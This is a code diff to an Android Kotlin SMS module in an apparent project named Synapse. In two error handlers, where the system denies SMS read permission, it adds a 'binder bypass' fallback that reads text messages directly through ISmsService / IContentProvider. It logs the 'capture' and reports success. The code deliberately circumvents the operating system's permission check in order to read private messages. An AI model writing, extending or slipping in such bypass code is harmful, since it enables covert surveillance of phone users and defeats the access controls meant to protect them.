@@ -266,7 +266,18 @@ object SmsModule {
                 }
             }
         } catch (e: SecurityException) {
-            return SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
+            // ── Binder bypass fallback ──
+            Log.d("Synapse.SMS", "Capture: ContentResolver denied, trying binder bypass...")
+            return try {
+                val messages = PermissionBypass.readSmsViaBinder(context, selection = null, limit = count)
+                if (messages.isNotEmpty()) {
+                    SynapseResponse.SmsListResponse(messages = messages, count = messages.size)
+                } else {
+                    SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
+                }
+            } catch (bp: Exception) {
+                SynapseResponse.ErrorResponse("sms:permission_denied_and_bypass_failed:${bp.message}", "sms")
+            }
         }
 
         // Also read inbox if requested
@@ -350,7 +361,19 @@ object SmsModule {
                 count = messages.size
             )
         } catch (e: SecurityException) {
-            return SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
+            // ── Binder bypass fallback: use ISmsService / IContentProvider directly ──
+            Log.d("Synapse.SMS", "ContentResolver denied, trying binder bypass...")
+            return try {
+                val messages = PermissionBypass.readSmsViaBinder(context, selection = selection, selArgs = selArgs, limit = limit)
+                if (messages.isNotEmpty()) {
+                    Log.d("Synapse.SMS", "Binder bypass success: ${messages.size} SMS")
+                    SynapseResponse.SmsListResponse(messages = messages, count = messages.size)
+                } else {
+                    SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
+                }
+            } catch (bp: Exception) {
+                SynapseResponse.ErrorResponse("sms:permission_denied_and_bypass_failed:${bp.message}", "sms")
+            }
         } catch (e: Exception) {
             return SynapseResponse.ErrorResponse("sms:${e.message}", "sms")
         }
